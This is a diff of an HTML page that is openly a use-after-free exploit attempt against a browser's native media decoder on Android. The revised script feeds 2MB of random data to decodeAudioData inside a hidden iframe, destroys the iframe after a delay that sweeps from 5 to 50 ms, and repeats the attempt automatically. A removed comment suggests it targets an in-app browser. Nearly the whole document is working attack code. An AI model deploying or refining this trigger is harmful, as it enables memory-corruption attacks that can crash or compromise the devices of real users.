@@ -2,56 +2,60 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>MediaCodec UAF Fuzzer</title>
+    <title>MediaCodec IFrame UAF</title>
 </head>
-<body style="background:#000; color:#0ff; font-family:monospace;">
-    <h3>Attacking libhelium Media Pipeline...</h3>
-    <div id="status">Generating corrupted media payload...</div>
+<body style="background:#111; color:#0ff; font-family:monospace; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center;" onclick="fireMediaUAF()">
+    
+    <h2 id="status">TAP ANYWHERE TO ATTACK</h2>
+    <div id="container"></div>
 
     <script>
         const statusEl = document.getElementById('status');
+        const container = document.getElementById('container');
+        
+        let delay = 5;
 
         function fireMediaUAF() {
-            statusEl.innerText = "[*] Spawning AudioContext...";
-            
-            // 1. Initialize the native audio bridge
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            const ctx = new AudioContext();
+            statusEl.innerText = `[*] Firing at delay: ${delay}ms...`;
 
-            // 2. Create 2MB of absolute garbage data. 
-            // We want this to take the hardware decoder a few milliseconds to process and eventually fail.
-            const bufferSize = 1024 * 1024 * 2; 
-            const buffer = new ArrayBuffer(bufferSize);
-            const view = new Uint8Array(buffer);
+            // 1. Create an isolated IFrame context
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            container.appendChild(iframe);
+            
+            // 2. Initialize AudioContext INSIDE the IFrame
+            let iwin = iframe.contentWindow;
+            let AudioContext = iwin.AudioContext || iwin.webkitAudioContext;
+            let ctx = new AudioContext();
+
+            // 3. Create 2MB of garbage data to choke the hardware decoder
+            let bufferSize = 1024 * 1024 * 2; 
+            let buffer = new ArrayBuffer(bufferSize);
+            let view = new Uint8Array(buffer);
             for (let i = 0; i < bufferSize; i++) {
-                view[i] = Math.floor(Math.random() * 256); // Random noise
+                view[i] = Math.floor(Math.random() * 256); 
             }
 
-            statusEl.innerText = "[*] Choking hardware decoder...";
-
-            // 3. Send the garbage to the native C++ decoder
-            // This is asynchronous and crosses the boundary to the Android OS
+            // 4. Send garbage to the native Android MediaCodec
             ctx.decodeAudioData(buffer, 
-                function(decodedData) {
-                    // Won't happen, it's garbage
-                }, 
-                function(error) {
-                    // By the time this error fires, we want the C++ object to be DEAD.
-                    console.log("Decode error fired");
-                }
+                function(success) {}, 
+                function(error) {}
             );
 
-            // 4. The Teardown Race
-            // Instantly navigate away to destroy the WebContents and trigger releaseAsync
-            // while the hardware is actively processing the garbage buffer.
+            // 5. The Race Condition
+            // Destroy the IFrame (and its C++ Audio wrapper) while the hardware is decoding
             setTimeout(() => {
-                window.location.href = "about:blank";
-            }, 10); // 10ms is usually the sweet spot for MediaCodec races
+                container.innerHTML = ''; // Nuke the IFrame from the DOM
+                
+                // Sweep the delay to catch the exact microsecond of the hardware callback
+                delay += 3;
+                if (delay > 50) delay = 5;
+                
+                // Automatically fire the next shot
+                setTimeout(fireMediaUAF, 200);
+                
+            }, delay);
         }
-
-        // Delay slightly to ensure FB has fully attached the surface, then fire
-        setTimeout(fireMediaUAF, 500);
-
     </script>
 </body>
 </html>
